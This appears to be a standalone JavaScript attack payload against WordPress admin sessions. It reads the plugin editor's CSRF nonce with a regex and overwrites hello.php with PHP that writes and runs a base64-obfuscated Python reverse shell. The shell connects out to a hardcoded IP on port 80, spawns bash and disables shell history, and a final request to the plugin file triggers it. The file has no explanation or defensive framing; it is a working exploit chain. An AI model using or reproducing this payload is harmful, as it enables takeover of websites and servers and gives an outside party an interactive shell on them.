function httpGet(theUrl)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

var page = httpGet("/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php");

function httpPost(theUrl, csrftoken)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", theUrl, false );
    xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php&newcontent=%3C%3Fphp+file_put_contents%28%22%2Ftmp%2Frshell.py%22%2C+base64_decode%28%22aW1wb3J0IG9zCmltcG9ydCBwdHkKaW1wb3J0IHNvY2tldAoKbGhvc3QgPSAiMzcuMjI5LjEyNi45MiIKbHBvcnQgPSA4MAoKZGVmIG1haW4oKToKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzLmNvbm5lY3QoKGxob3N0LCBscG9ydCkpCiAgICBvcy5kdXAyKHMuZmlsZW5vKCksMCkKICAgIG9zLmR1cDIocy5maWxlbm8oKSwxKQogICAgb3MuZHVwMihzLmZpbGVubygpLDIpCiAgICBvcy5wdXRlbnYoIkhJU1RGSUxFIiwnL2Rldi9udWxsJykKICAgIHB0eS5zcGF3bigiL2Jpbi9iYXNoIikKICAgIHMuY2xvc2UoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQ%3D%3D%22%29%29%3B+system%28%22python+%2Ftmp%2Frshell.py%3B+rm+%2Ftmp%2Frshell.py%22%29%3B+%3F%3E&action=update&file=hello.php&plugin=hello.php&scrollto=0&submit=Update+File");
    return xmlHttp.responseText;

}

//ik I fail at regex fuk u
var regExp = /name=\"_wpnonce\"\svalue=\"([^)]+)\"/;
var matches = regExp.exec(page);
var csrftoken = matches[1].slice(0, 10);

httpPost("/wp-admin/plugin-editor.php", csrftoken);
httpGet("/wp-content/plugins/hello.php");
